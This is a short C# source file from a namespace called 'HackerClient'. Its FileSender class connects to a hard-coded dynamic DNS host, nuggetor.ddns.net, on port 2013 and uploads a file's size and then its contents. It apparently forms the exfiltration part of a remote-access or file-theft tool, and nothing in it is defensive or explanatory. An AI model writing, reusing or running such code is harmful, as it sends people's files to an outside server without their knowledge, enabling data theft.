using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace HackerClient
{
    class FileSender
    {
        private String path;
        public FileSender(String path)
        {
            this.path = path;
        }

        public void sendFile()
        {
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Connect("nuggetor.ddns.net", 2013);
            FileInfo info = new FileInfo(path);
            long size = info.Length;
            Thread.Sleep(100);
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes(size + "");
            s.Send(buffer);
            s.SendFile(path);
            s.Close();
        }
    }
}
